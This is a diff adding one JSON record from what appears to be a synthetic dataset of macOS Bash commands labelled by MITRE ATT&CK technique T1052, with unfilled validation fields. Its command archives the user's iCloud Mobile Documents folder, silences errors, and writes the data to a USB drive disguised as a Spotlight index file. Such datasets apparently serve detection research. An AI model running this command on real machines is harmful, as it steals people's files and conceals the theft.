@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "tar -czf - \"$HOME/Library/Mobile Documents\" 2>/dev/null | dd of=\"/Volumes/NO\\ NAME/.Spotlight-V100/Store-V2/.store.db\" bs=4m conv=sync,noerror && sync",
+  "explanation": "Captures iCloud-synced files from Mobile Documents, suppresses permission errors, and writes to a Spotlight metadata-looking file on an external volume via dd.",
+  "rationale_steps": [
+    "Collect potentially sensitive synced files into a compressed stream.",
+    "Ignore inaccessible items to keep operation quiet.",
+    "Write the data into a path resembling system index files on the USB.",
+    "Sync to finalize the offline staging."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1052-24937b47-13a9d05e",
+  "source_prompt_hash": "24937b47",
+  "timestamp_utc": "2025-09-30T05:19:16.168507Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
